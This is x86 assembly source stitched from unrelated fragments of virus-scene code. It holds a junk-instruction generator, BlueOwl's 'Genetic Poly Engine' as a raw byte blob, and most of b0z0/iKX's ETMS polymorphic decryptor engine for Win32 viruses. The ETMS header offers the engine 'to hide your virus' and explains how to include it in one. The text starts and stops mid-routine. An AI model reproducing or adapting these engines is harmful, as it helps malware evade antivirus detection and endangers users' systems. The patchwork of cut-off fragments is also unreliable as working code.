	ja	mreg6
	mov	ah,0ffh
	jmp	exitmreg
mreg6:	cmp	eax,1770h
	ja	mreg7
	mov	ah,0f6h
	jmp	exitmreg
mreg7:	cmp	eax,1b58h
	ja	mreg8
	mov	ah,0edh
	jmp	exitmreg
mreg8:	mov	ah,0e4h
exitmreg:
	mov	al,8bh
	stosw
	ret
	
GenAnd:
	;this function generate and ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nand1
	mov	ah,0e3h
	jmp	wand
nand1:	cmp	al,0a0h
	ja	nand2
	mov	ah,0e2h
	jmp	wand
nand2:	mov	ah,0e5h
wand:	mov	al,81h
	stosw
	pop	eax
	stosd
	ret
	
GenMove:
	;this function generate mov ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nmov1
	mov	al,0bbh
	jmp	wmov
nmov1:	cmp	al,0a0h
	ja	nmov2
	mov	al,0bah
	jmp	wmov
nmov2:	mov	al,0bdh
wmov:	stosb
	pop	eax
	stosd
	ret

GenPushTrashPopReg:
	;this function generate push trash\ pop ebp\ebx\edx instruction
	call	GenRandomNumber
	mov	byte ptr [edi],68h
	inc	edi
	stosd
	cmp	al,55h
	ja	nextpt
	mov	byte ptr [edi],5dh
	jmp	wpop
nextpt:	cmp	al,0aah
	ja	nextpt2
	mov	byte ptr [edi],5ah
	jmp	wpop
nextpt2:mov	byte ptr [edi],5bh
wpop:	inc	edi
	ret	
	
GenShrReg:				;gen shr unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshr
	mov	byte ptr [edi],0edh
	jmp	wshr
nshr:	cmp	al,0a0h
	ja	nshr2
	mov	byte ptr [edi],0eah
	jmp	wshr
nshr2:	mov	byte ptr [edi],0ebh
wshr:	inc	edi
	stosb
	ret
	
GenShlReg:				;gen shl unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshl
	mov	byte ptr [edi],0e3h
	jmp	wshl
nshl:	cmp	al,0a0h
	ja	nshl2
	mov	byte ptr [edi],0e2h
	jmp	wshl
nshl2:	mov	byte ptr [edi],0e5h
wshl:	inc	edi
	stosb
	ret
	
GenRorReg:				;gen ror unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nror
	mov	byte ptr [edi],0cbh
	jmp	wror
nror:	cmp	al,0a0h
	ja	nror2
	mov	byte ptr [edi],0cah
	jmp	wror
nror2:	mov	byte ptr [edi],0cdh
wror:	inc	edi
	stosb
	ret
	
	
GenRolReg:				;gen rol unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nrol
	mov	byte ptr [edi],0c3h
	jmp	wrol
nrol:	cmp	al,0a0h
	ja	nrol2
	mov	byte ptr [edi],0c2h
	jmp	wrol
nrol2:	mov	byte ptr [edi],0c5h
wrol:	inc	edi
	stosb
	ret
	
GenOrReg:				;gen or unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nor
	mov	ah,0cbh
	jmp	wor
nor:	cmp	ah,0a0h
	ja	nor2
	mov	ah,0cah
	jmp	wor
nor2:	mov	ah,0cdh
wor:	stosw
	pop	eax
	stosd
	ret

GenXorReg:				;gen xor unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nXor
	mov	ah,0f3h
	jmp	wXor
nXor:	cmp	ah,0a0h
	ja	nXor2
	mov	ah,0f2h
	jmp	wXor
nXor2:	mov	ah,0f5h
wXor:	stosw
	pop	eax
	stosd
	ret


GenSubAddTrash:				;gen add reg,num\sub reg,num
noesp:	call	GenRandomNumber
	mov	ebx,eax
	cmp	al,80h
	ja	sub_f
	and	ah,7h
	add	ah,0c0h
	cmp	ah,0c4h
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0e8h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	jmp	exitsa
sub_f:	and	ah,7h
	add	ah,0e8h
	cmp	ah,0ech
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0c0h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
exitsa:	ret

OneByte:				;gen one byte do nothing instruction
	call	GenRandomNumber
	cmp	al,32h
	ja	byte1
	mov	al,90h
	jmp	end_get_byte
byte1:	cmp	al,64h
	ja	byte2
	mov	al,0f8h
	jmp	end_get_byte
byte2:	cmp	al,96h
	ja	byte3
	mov	al,0f5h
	jmp	end_get_byte
byte3:	cmp	al,0c8h
	ja	byte4
	mov	al,0f9h
	jmp	end_get_byte
byte4:	mov	al,0fch
end_get_byte:
	stosb
	ret

        ; BGPE  - BlueOwls Genetic Poly Engine (Simple version, v0), november 2004

	; Al though this is just a "simple" version, feel free to spread and
	; use it in whatever you like, as long as you don't hold me responsible
	; AND don't claim it is yours. :) What i was thinking about adding was
	; placing all the code blocks in random order, maybe something for a
	; next version ;). I have not tested it thouroughly, so it could have
	; bugs causing it not to function properly or not to function at all. I
	; just hope it does not have bugs :).

	; Good luck with it.
	; BlueOwl


                ; in:   eax = random number
                ;       ecx = size of virus in bytes rounded to a dword ((virus_size+3)/4)*4
                ;       esi = start of virus
                ;       edi = start of outputbuffer
                ;
                ; out:  eax = size of generated

		; size of bgpe: 646 bytes

bgpe:           db      060h,0E8h,000h,000h,000h,000h,05Dh,0FFh,075h,062h
                db      0FFh,0B5h,07Ch,001h,000h,000h,0FFh,0B5h,080h,001h
                db      000h,000h,055h,051h,08Dh,08Dh,07Ch,001h,000h,000h
                db      08Dh,05Dh,062h,089h,0E5h,083h,0C5h,004h,0E8h,049h
                db      002h,000h,000h,092h,0E8h,043h,002h,000h,000h,021h
                db      0C2h,0E8h,03Ch,002h,000h,000h,021h,0C2h,0E8h,035h
                db      002h,000h,000h,021h,0C2h,031h,013h,06Ah,007h,05Ah
                db      087h,0CAh,0E8h,027h,002h,000h,000h,0A9h,007h,000h
                db      000h,000h,075h,005h,08Ah,002h,088h,042h,001h,042h
                db      0E2h,0ECh,059h,0B0h,0E8h,0AAh,089h,0C8h,0ABh,057h
                db      0C1h,0E9h,002h,068h,000h,000h,000h,000h,051h,050h
                db      0F3h,0A5h,0E8h,0FFh,001h,000h,000h,050h,0E8h,001h
                db      001h,000h,000h,005h,006h,058h,006h,050h,005h,08Bh
                db      00Eh,004h,024h,006h,0FFh,034h,024h,006h,058h,009h
                db      00Bh,00Eh,004h,024h,023h,00Eh,004h,024h,004h,016h
                db      0B8h,066h,005h,068h,066h,016h,058h,009h,083h,016h
                db      0E0h,000h,081h,016h,0C0h,066h,005h,08Dh,01Eh,005h
                db      066h,005h,04Eh,087h,02Eh,000h,007h,04Eh,0FFh,006h
                db      030h,026h,058h,005h,04Eh,08Bh,02Eh,000h,008h,04Eh
                db      00Bh,02Eh,000h,023h,02Eh,000h,016h,08Dh,06Eh,080h
                db      056h,0C1h,026h,0C0h,05Eh,076h,051h,00Fh,0B6h,04Dh
                db      0ECh,0D3h,0C8h,059h,02Bh,045h,01Ch,0C3h,014h,0C1h
                db      026h,0C8h,05Eh,0F7h,026h,0D8h,076h,0F7h,0D8h,051h
                db      00Fh,0B6h,04Dh,0ECh,0D3h,0C0h,059h,0C3h,00Fh,00Fh
                db      026h,0C8h,081h,026h,0F0h,056h,076h,033h,045h,01Ch
                db      00Fh,0C8h,0C3h,00Fh,081h,026h,0E8h,056h,0F7h,026h
                db      0D0h,076h,0F7h,0D0h,003h,045h,01Ch,0C3h,004h,087h
                db      02Eh,000h,006h,026h,050h,08Fh,006h,000h,004h,089h
                db      02Eh,000h,007h,021h,02Eh,000h,009h,02Eh,000h,005h
                db      08Dh,036h,040h,004h,005h,083h,006h,0C0h,004h,005h
                db      083h,006h,0E8h,0FCh,009h,006h,040h,006h,040h,006h
                db      040h,006h,040h,003h,016h,048h,005h,083h,016h,0E8h
                db      001h,005h,083h,016h,0C0h,0FFh,005h,08Dh,03Eh,040h
                db      0FFh,008h,009h,03Eh,0C0h,074h,002h,0EBh,046h,007h
                db      016h,040h,016h,048h,075h,046h,007h,083h,016h,0F8h
                db      001h,073h,046h,009h,016h,048h,078h,003h,016h,040h
                db      079h,046h,002h,0C3h,004h,0C2h,000h,000h,004h,058h
                db      0FFh,0E0h,007h,0FFh,034h,024h,0C2h,004h,000h,000h
                db      05Ah,0E8h,007h,000h,000h,000h,000h,001h,002h,003h
                db      005h,006h,007h,05Bh,080h,03Ah,000h,00Fh,084h,0C7h
                db      000h,000h,000h,089h,0D6h,06Ah,004h,059h,00Fh,0B6h
                db      002h,001h,0C2h,0E2h,0F9h,08Bh,04Dh,0F8h,0C1h,06Dh
                db      0F8h,002h,083h,0E1h,003h,009h,0C9h,074h,007h,00Fh
                db      0B6h,006h,001h,0C6h,0E2h,0F9h,00Fh,0B6h,00Eh,049h
                db      046h,0ACh,050h,083h,0E0h,007h,083h,0F8h,006h,058h
                db      074h,009h,008h,0E0h,0AAh,028h,0E4h,0E2h,0EEh,0EBh
                db      0BDh,00Fh,0B6h,0C0h,0C1h,0E8h,003h,052h,0E8h,00Fh
                db      000h,000h,000h,058h,034h,060h,03Ah,047h,04Bh,053h
                db      05Bh,064h,06Ch,070h,07Ch,075h,041h,01Ch,05Ah,08Ah
                db      004h,002h,001h,0C2h,029h,0C0h,0FFh,0D2h,05Ah,0EBh
                db      0D4h,052h,057h,087h,0F2h,08Bh,04Dh,0F4h,08Bh,075h
                db      0FCh,089h,0F7h,0ADh,0FFh,0D2h,0ABh,0E2h,0FAh,06Ah
                db      001h,059h,05Fh,05Ah,0C3h,08Ah,023h,0C0h,0E4h,003h
                db      0C3h,08Ah,063h,001h,0C0h,0E4h,003h,0C3h,08Ah,063h
                db      002h,0C0h,0E4h,003h,00Ah,063h,002h,0C3h,08Ah,063h
                db      002h,0C0h,0E4h,003h,0EBh,005h,08Ah,023h,0C0h,0E4h
                db      003h,00Ah,023h,0C3h,0E8h,0DAh,0FFh,0FFh,0FFh,00Ah
                db      063h,001h,0C3h,08Bh,045h,0F0h,029h,0F8h,048h,0AAh
                db      0C3h,089h,07Dh,0F0h,0C3h,08Bh,045h,01Ch,0EBh,003h
                db      08Bh,045h,0F4h,0ABh,029h,0C0h,0C3h,08Ah,045h,0ECh
                db      0AAh,0C3h,089h,0ECh,05Dh,08Fh,085h,080h,001h,000h
                db      000h,08Fh,085h,07Ch,001h,000h,000h,08Fh,045h,062h
                db      089h,07Ch,024h,01Ch,061h,029h,0F8h,0C3h,08Bh,045h
                db      01Ch,0C1h,0C0h,007h,066h,0F7h,0D8h,005h,0A5h,023h
                db      08Fh,0B7h,031h,045h,01Ch,0C3h

		; Copyright BlueOwl, november 2004



;
;
;                      - expressway to my skull -
;                             [ETMS]  v0.1
;                              -b0z0/iKX-
;
; Intro:
;  This is a polymorphic engine for Win95/98/32 based viruses. It (not sure
; about this anyway) creates quite polymorphic decryptors that could be used
; to hide your virus or something else. Skip some lines to get a tech
; description and try to generate a few samples to see what it can do.
;  Somebody could ask which is the sense of such a name for a poly. The answer
; is simple: should there be a reason for everything? I find a lot of things
; totally nonsense, so why should poly engines have a name that could fit for
; a poly engine? I just felt like using this name for my poly and I did so. It
; is somewhat a change from the title of a Sonic Youth song named 'Expressway
; to yr skull' (named also 'The Crucifixion of Sean Penn' or 'Madonna, Sean and
; me'), a song that I like and that I found very near when I was writing this
; poly engine.
;
; Features:
;   Basic features:
;       - Encryption using XOR/ADD/SUB/ROL/ROR on bytes/words/dwords with
;         either fixed (fixed immediate or fixed reg) or changing key
;       - Can use all registers as pointers, counters and key holders
;       - Can encrypt from start to end and from end to beginning
;       - Can create memory reference with offset (ie. [ECX + 1234h])
;       - Counter with random costants added, counts both decrementing or
;         incrementing its value
;       - Key change using XOR/ADD/SUB/ROL/ROR/INC/DEC on bytes/words/dwords
;         of the key register
;       - Quite some different ways of counting loop
;       - Some garbage is encrypted aswell
;       - Lenght of generated decryptors range somewhere between 400
;         bytes up to 4kbs
;
;   Garbage:
;       - All the normal math, logical and comparation operations and
;         assignations on registers, immediates and memory references
;       - Moving and exchanging of registers
;       - Push of regs/imms/mem_data, pop to regs
;       - Creation of fake subroutines
;       - Conditional and unconditional jumps
;       - Usual one byte opcodes
;       - Temporary saves somewhere (to another register or to stack) important
;         registers (such as key, counter and pointer) and makes garbage with
;         them.
;       - More or less all the usual code you could find around in normal
;         programs, excepts memory writes and such. Anyway you'd better give a
;         look to some decryptors, it is not easy to write too deeply what it
;         does.
;
;
; Using the poly:
;   Just add the ETMS source in your virus, simply:
;     include         etms.asm
;   Set the registers as described below and then call the poly. The poly uses
;  some data for internal purposes. This data of course is not needed to be
;  carried around with your infected file or whatever. You can just include
;  the ETMS source at the end of the file and then skip the bytes that start
;  from the label _mem_data_start. Of course you'll need to have that free
;  memory placed there at runtime.
;   The random seed (the dd at seed) should be initialized at first poly
;  run to a value between 0 and 714024.
;
;    Calling parameters:
;       ECX     =       Lenght of things to be encrypted
;       ESI     =       Pointer to what we want to encrypt
;       EDI     =       Where to place decryptor and encrypted stuff
;       EBP     =       Offset at which decryptor will run
;
;    On exit:
;       EDI     =       Pointer to generated code
;       ECX     =       Lenght of generated code (decryptor + encrypted code)
;
; Note:
;  I tried to write the poly quite clearly adding quite some comments.
; Nevertheless in some parts the code could be a bit messy or strange since
; I tried to optimize it at least a bit (like converting most of direct
; memory 32bit references to a reference [reg + off8] that are much shorter).
; I apologize for some quite messy code and if you have some problems
; understanding something, please contact me.
;
; Contacts:
;  For any question, comment or whatever about the poly or about whatever feel
; free to mail me at cl0wn@geocities.com.
;
;

etms_engine:
        cld
        push    edi
        push    edi

        call    poly_delta
poly_delta:
        pop     eax                     ; where we are running
        sub     eax,offset poly_delta
        push    eax

        lea     ebx,[offset t_inipnt + eax]

o_tini  equ     offset t_inipnt         ; save some bytes since off between
                                        ; various data is a 8b

        mov     dword ptr [ebx],edi
        mov     dword ptr [ebx - (o_tini - offset v_lenght)],ecx
        mov     dword ptr [ebx - (o_tini - offset v_virusp)],esi
        mov     dword ptr [ebx - (o_tini - offset v_runnin)],ebp

        mov     dword ptr [ebx - (o_tini - offset r_pointer)],010ffffffh
        mov     dword ptr [ebx - (o_tini - offset t_chgpnt)],01000404h

        xor     eax,eax
        mov     dword ptr [ebx - (o_tini - offset t_fromend)],eax
        mov     dword ptr [ebx - (o_tini - offset t_pntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_cntoff)],eax
        mov     dword ptr [ebx - (o_tini - offset t_inacall) - 2],eax

        xor     cl,cl
bit_loop:
        shl     ebp,1
        jc      founded_first1                  ; find higher bit with an 1
        inc     cl                              ; for random memory offsets
        jmp     bit_loop
founded_first1:
        mov     byte ptr [ebx - (o_tini - offset t_memand)],cl

        pop     ebp                             ; delta

        push    edi
        mov     al,90h
        lea     edi,[offset enc_space + ebp]
        mov     dword ptr [ebx - (o_tini - offset w_encrypt)],edi
        mov     ecx,enc_max
        rep     stosb
        pop     edi

        call    rnd_garbage

        mov     ecx,3
        lea     esi,[offset r_pointer + ebp]

init_part:
        push    ecx
select_register:
        call    get_register                    ; get a unused register
        xchg    eax,ecx

        call    set_used                        ; mark as unusable in future
        xchg    eax,ebx

select_block:
        call    get_random_al7
        and     al,011b
        jz      select_block                    ; select from 01 to 03

        dec     eax
        cmp     byte ptr [eax+esi],0ffh         ; check if that stage already
        jne     select_block                    ; done

        mov     byte ptr [eax+esi],bl           ; save the register for that
                                                ; stage
        or      al,al
        jnz     not_pointer

        mov     dword ptr [esi - (offset r_pointer - offset w_pointer)],edi
                                                ; save offset where the
                                                ; pointer is initialized
        jmp     assign_next

not_pointer:
        dec     eax
        jnz     not_counter

        mov     dword ptr [esi - (offset r_pointer - offset w_counter)],edi
        jmp     assign_next                     ; assign inital counter

not_counter:

        call    get_random                      ; get key
        mov     dword ptr [esi - (offset r_pointer - offset v_initkey)],eax
        xchg    eax,ecx

        call    get_random
        and     al,1
        jz      assign_next                     ; if so use key
        call    unset_used
        mov     byte ptr [esi+2],20h            ; don't use key
        jmp     next_loop
assign_next:
                ; BL  register
                ; EAX value
        xchg    eax,ebx                 ; in bl register
        or      al,0b8h                 ; mov base
        stosb
        xchg    eax,ecx
        stosd                           ; the value

next_loop:
        call    rnd_garbage
        pop     ecx
        loop    init_part               ; make all init steps


; now some base assignment to a pointer, counter and key (if used) registers
; has been done. here we are gonna change a bit the various registers where
; the various things has been assigned
        call    get_random_al7
        and     al,011b                 ; from 0 to 3 moves
        jz      decryptor_build_start
        xchg    eax,ecx
reg_movida:
        push    ecx
get_whichone:
        call    select_save             ; select which to change (pnt,cnt,key)
        jc      leave_this_out

        call    save_mov_xchg           ; change the regs using mov or xchg
        mov     byte ptr [edx],al
leave_this_out:
        pop     ecx
        loop    reg_movida

decryptor_build_start:
; decryptor loop begins right here

        lea     esi,[offset t_chgpnt + ebp]
        mov     dword ptr [esi - (offset t_chgpnt - offset w_loopbg)],edi

        call    get_random              ; select if starting from head or from
        and     ax,0101h                ; tail and if counter will dec or inc
        mov     word ptr [esi - (offset t_chgpnt - offset t_fromend)],ax

        xchg    eax,edx                 ; rnd in edx

        shl     edx,1                   ; add a constant to counter?
        jnc     normal_counter
        call    get_random
        mov     dword ptr [esi - (offset t_chgpnt - offset t_cntoff)],eax
normal_counter:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_pointer)],05h
                                        ; no bp + off
        je      reget_size_op

        shl     edx,1                   ; select if use only pointer or
        jc      reget_size_op           ; pointer + offset
        call    get_random              ; select random offset
        mov     dword ptr [esi - (offset t_chgpnt - offset t_pntoff)],eax
                                        ; if using get offset
reget_size_op:
        call    get_random
        mov     edx,eax
        and     eax,0fh                 ; select math operation and size
        or      eax,eax                 ; of operand
        jz      reget_size_op

;      byte  word  dword
; ror   1     6     b
; sub   2     7     c
; xor   3     8     d
; add   4     9     e
; rol   5     a     f
;
no_rorrrpr:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],03
                                        ; if not ax,cx,dx,bx then can't be byte
        jb      can_use_all             ; as key
        cmp     al,6                    ; is byte? get another
        jb      reget_size_op

can_use_all:
        xor     ecx,ecx
        mov     cl,9
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      no_keychanges

        shr     edx,8                   ; edx has rnd
        and     edx,011b
        mov     byte ptr [esi - (offset t_chgpnt - offset t_chgkey)],dl
        add     ecx,edx

no_keychanges:
        cmp     al,0bh
        jae     ok_counts
        sub     ecx,4d                  ; if with words 4 inc/dec less
        sub     word ptr [esi],0202h
        cmp     al,06d
        jae     ok_counts
        dec     ecx                     ; for bytes even less
        dec     ecx
        sub     word ptr [esi],0101h

ok_counts:
        push    eax
        call    rnd_garbage
get_nextseq:
        call    get_random
        and     eax,011b
        xchg    eax,edx
        cmp     byte ptr [esi+edx],0
        je      get_nextseq
        dec     byte ptr [esi+edx]
        shl     edx,2                   ; offset = * 4
        sub     edx,(offset t_chgpnt - offset o_table)
        pop     eax
        push    eax
        push    ecx
        push    esi
        mov     ecx,dword ptr [esi+edx]
        add     ecx,ebp
        call    ecx                     ; call the routine to do it
        pop     esi
        pop     ecx
        pop     eax
        loop    ok_counts

; finished decryption loop, needs comparation and jumps
        call    rnd_garbage

        xor     eax,eax
        inc     eax
        mov     ecx,dword ptr [esi - (offset t_chgpnt - offset t_cntoff)]
        or      ecx,ecx
        jnz     must_compare

get_checker:
        call    get_random
        and     eax,0fh
        cmp     al,09d
        ja      get_checker
must_compare:
        shr     al,1
        pushf
        mov     ah,byte ptr [eax + offset chk_counter + ebp]   ; get comparer
        add     ah,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        mov     al,81h
        popf
        jc      store_d00
        inc     eax
        inc     eax
        stosw
        xor     al,al
        stosb
        jmp     make_jumps
store_d00:
        stosw
        xchg    eax,ecx
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],00h
        je      not_negcnt1
        neg     eax
not_negcnt1:
        stosd
make_jumps:
        call    get_random
        ror     al,1
        jc      do_withlong
        stosw

        call    make_jmpback            ; do jump back, in EAX lenght of jump

        cmp     eax,7fh                 ; max short jump offset
        jb      ok_offsetj
        mov     edi,ebx                 ; if > then redo from start
        dec     edi
        dec     edi
        jmp     make_jumps
ok_offsetj:
        mov     ah,74h                  ; jne + offset
        xchg    al,ah
        mov     word ptr [ebx-2],ax
        jmp     done_cond
do_withlong:
        mov     ax,840fh                ; jz long
        stosw
        stosd
        call    make_jmpback            ; do jump back, in EAX lenght of jump

        mov     dword ptr [ebx-4],eax     ; store the lenght
done_cond:


; now decryption loop generation is finished
        lea     esi,[offset v_lenght + ebp]
        mov     byte ptr [esi - (offset v_lenght - offset r_used)],10h
                                        ; can use all regs (except ESP) again

        call    rnd_garbage             ; unencrypted one, some more here
        call    rnd_garbage

        push    edi
        call    rnd_garbage                     ; encrypted garbage
        pop     ecx
        neg     ecx
        add     ecx,edi                 ; how much encrypted garbage

        mov     edx,ecx
        sub     edi,edx

        add     ecx,dword ptr [esi]

        shr     ecx,2                   ; so it will be enough for b/w/d enc
        inc     ecx
        shl     ecx,2

        pop     eax
        neg     eax
        add     eax,edi                         ; lenght of decryptor
        add     eax,dword ptr [esi - (offset v_lenght - offset v_runnin)]
                                                ; running offset
        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_pointer)]
        cmp     byte ptr [esi - (offset v_lenght - offset t_fromend)],00h
        pushf
        je      no_adding
        add     eax,ecx                         ; from end
no_adding:
        sub     eax,dword ptr [esi - (offset v_lenght - offset t_pntoff)]
                                                ; - pointer offset if is there
        mov     dword ptr [ebx+1],eax           ; set initial pointer

        mov     ebx,dword ptr [esi - (offset v_lenght - offset w_counter)]
        inc     ebx
        mov     eax,dword ptr [esi - (offset v_lenght - offset t_cntoff)]
        add     eax,ecx
        mov     dword ptr [ebx],eax

        cmp     byte ptr [esi - (offset v_lenght - offset t_countback)],00h
        je      not_negcnt
        neg     dword ptr [ebx]

not_negcnt:

        mov     esi,dword ptr [esi - (offset v_lenght - offset v_virusp)]

        mov     ebx,edi                 ; pointer on code to encrypt
        add     edi,edx                 ; + encrypted garbage
        popf
        je      no_adding2
        add     ebx,ecx                 ; add lenght if from end

no_adding2:

        push    ecx
        sub     ecx,edx
        rep     movsb                   ; copy what to encrypt
        pop     edx

        db      0b9h                    ; mov ecx
v_initkey       dd      00h             ; initial key value

enc_max equ     20h
; lenghts
; 6     = max encryption operation
; 4     = max 4 inc/dec counter
; 4     = max 4 inc/dec counter
; 3 * 6 = max 3 * 6 byte key change operations

enc_space:
        db      enc_max dup (90h)       ; here the encryptor will be placed
        or      edx,edx
        jnz     enc_space               ; loop

        mov     ecx,edi
        pop     edi
        sub     ecx,edi                 ; total lenght
        ret                             ; poly finished
; - ETMS return point

poly_name       db      '[ETMS] v0.1 -b0z0/iKX-',0

make_jmpback:
        push    edi

        call    rnd_garbage

        mov     al,0e9h
        stosb
        mov     eax,dword ptr [esi - (offset t_chgpnt - offset w_loopbg)]
                                                ; the jump back to start of
        sub     eax,04h                         ; the decryptor
        sub     eax,edi
        stosd

        call    rnd_garbage

        pop     eax
        mov     ebx,eax
        neg     eax
        add     eax,edi                 ; calculate lenght of jump and return
        ret                             ; with it

put_encloop_2:
        push    ecx
        xor     ecx,ecx
        inc     ecx
        inc     ecx
        jmp     short put_encloop
put_encloop_1:
        push    ecx
        xor     ecx,ecx
        inc     ecx
put_encloop:
; ecx nr of bytes
        push    eax
        xchg    edi,dword ptr [w_encrypt+ebp]   ; in EDI where we are in enc
                                                ; and save dec position
copy_it:
        stosb
        shr     eax,8
        loop    copy_it
        xchg    dword ptr [w_encrypt+ebp],edi   ; save next and restore dec pnt
        pop     eax
        pop     ecx
        ret

o_table:
o_counter       dd      offset ch_counter
o_pointer       dd      offset ch_pointer
o_key           dd      offset ch_key
o_mate          dd      offset ch_mate

ch_counter:                             ; decrement/increment counter
        mov     al,48h                  ; dec
        push    eax
        or      al,02h                  ; counter in enc uses EDX
        call    put_encloop_1
        pop     eax
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_countback)],00h
        je      decrementing
        sub     al,08h                  ; else incrementing counter
decrementing:
        or      al,byte ptr [esi - (offset t_chgpnt - offset r_counter)]
        stosb
        ret

ch_pointer:                             ; increment/decrement pointer
        mov     al,40h                  ; inc
        cmp     byte ptr [esi - (offset t_chgpnt - offset t_fromend)],00h
        je      straight_up
        add     al,08h
straight_up:
        push    eax
        or      al,03h                  ; ebx
        call    put_encloop_1
        pop     eax
        or      al,byte ptr [esi - (offset t_chgpnt - offset r_pointer)]
        stosb
        ret

ch_key:                                 ; change key register
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        je      exit_keychange
get_modifier:
        call    get_random_al7
        cmp     al,6
        ja      get_modifier
        mov     cl,al
        mov     ah,byte ptr [eax + offset key_changers + ebp]
        mov     al,81h          ; add/sub/xor base
        cmp     cl,3
        jb      no_rrrr
        mov     al,0c1h         ; rol/ror base
no_rrrr:
        push    eax
reget_ksize:
        call    get_random      ; select if byte/word/dword
        and     al,011b
        jz      reget_ksize
        cmp     cl,04h          ; inc dec just on dw and dd
        jb      isntincdec
        cmp     al,01h
        je      reget_ksize
isntincdec:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],3
        jbe     canall
        cmp     al,01b          ; byte keychange only for ax,cx,dx,bx
        je      reget_ksize
canall:
        mov     ch,al
        pop     eax
        cmp     ch,01h
        jne     no_decbyte
        dec     al
no_decbyte:
        cmp     ch,02h
        jne     no_wordprefix
        push    eax
        mov     al,66h
        stosb
        call    put_encloop_1
        pop     eax
no_wordprefix:
        cmp     cl,05h
        pushf
        jb      no_incdecch             ; inc/dec has just one byte opcode
        dec     edi
        mov     al,byte ptr [edi]
no_incdecch:
        popf
        push    eax
        jb      no_nopneeded
        mov     al,ah
        or      al,1            ; ecx key in enc loop
        call    put_encloop_1   ; for inc/dec
        jmp     short after_store
no_nopneeded:
        or      ah,1            ; key is ECX in enc loop
        call    put_encloop_2
after_store:
        pop     eax
        or      ah,byte ptr [esi - (offset t_chgpnt - offset r_regkey)]
        stosw
        cmp     cl,05           ; inc/dec doesn't need any key
        jae     exit_keychange
        call    get_random
        cmp     cl,03
        jae     just_one_bk     ; ror/rol just one byte key
        cmp     ch,01h
        je      just_one_bk     ; check dimension of key modifier
        stosb
        call    put_encloop_1
        shr     eax,8h
        cmp     ch,02h
        je      just_one_bk
        stosw
        call    put_encloop_2
        shr     eax,10h
just_one_bk:
        stosb
        call    put_encloop_1
exit_keychange:
        ret

ch_mate:                        ; creates the decryption math operation
        xor     edx,edx
        mov     ecx,5h
type_sel:
        cmp     eax,ecx
        jbe     ok_regs
        inc     edx
        sub     eax,ecx
        jmp     type_sel        ; get type and size.. in EDX size, in EAX type
                                ; edx = 0 for byte, 1 for word, 2 for dword
ok_regs:
        cmp     byte ptr [esi - (offset t_chgpnt - offset r_regkey)],20h
        lea     esi,[offset _math_imm + ebp]
        je      without_key
        add     esi,(offset _math_key - offset _math_imm)
without_key:
        dec     eax             ; type - 1
        push    esi
        push    eax
        shl     eax,1           ; each type is a word
        add     esi,eax
        lodsw                   ; ax = mathop word

        cmp     dl,1
        jne     not_word
        push    eax
        mov     al,066h
        stosb
        call    put_encloop_1
        pop     eax
not_word:
        or      dl,dl
        jnz     not_byte
        dec     al
not_byte:
        pop     ebx             ; type - 1
        pop     esi             ;

        push    ebx

        push    eax
        neg     ebx
        add     ebx,4           ; get opposite math operation
        shl     ebx,1
        add     esi,ebx
        lodsw

        lea     esi,[offset r_regkey + ebp]
        cmp     byte ptr [esi],20h
        je      ok_regskey
        cmp     al,0d3h
        je      ok_regskey
        add     ah,08h          ; since ECX is used as key
ok_regskey:
        or      dl,dl
        jnz     not_byterev
        dec     al
not_byterev:
        add     ah,03h          ; in enc loop using EBX
        call    put_encloop_2
        pop     eax

        mov     cl,byte ptr [esi - (offset r_regkey - offset r_pointer)]
        cmp     cl,03h          ; eax-ebx
        ja      upper_ones
        add     ah,cl
        jmp     ok_register_p
upper_ones:
        add     ah,06h
        cmp     cl,06h          ; esi
        je      ok_register_p
        inc     ah
        cmp     cl,07h          ; edi
        je      ok_register_p
        add     ah,03eh         ; ebp
ok_register_p:

        pop     ecx             ; type-1

        cmp     dword ptr [esi - (offset r_regkey - offset t_pntoff)],0
        je      not_plusoff
        add     ah,80h
not_plusoff:
        stosw

        xor     eax,eax

        cmp     byte ptr [esi],20h    ; using key?
        je      ok_register_k

        or      cl,cl
        je      check_rr
        cmp     cl,4
        jne     not_rol_ror
check_rr:
        cmp     byte ptr [esi],1   ; is key CX (cl)
        je      ok_register_k
        mov     al,10h                  ; if not put just immediate
        sub     byte ptr [edi-2],12h

        mov     ebx,dword ptr [esi - (offset r_regkey - offset w_encrypt)]
        sub     byte ptr [ebx-2],12h

        push    ecx
        mov     bl,20h
        xchg    bl,byte ptr [esi]       ; won't use key reg anymore in the
        call    unset_used              ; future, so use for garbage
        pop     ecx
        jmp     short ok_register_k

not_rol_ror:
        mov     al,byte ptr [esi]
        shl     eax,3                   ; * 8
        add     byte ptr [edi-1],al     ; key register

ok_register_k:
        cmp     byte ptr [esi - (offset r_regkey - offset r_pointer)],05h
        jne     not_usingbp
        mov     byte ptr [edi],00h
        inc     edi
not_usingbp:

        mov     eax,dword ptr [esi - (offset r_regkey - offset t_pntoff)]
        or      eax,eax
        jz      no_offsetadd
        stosd
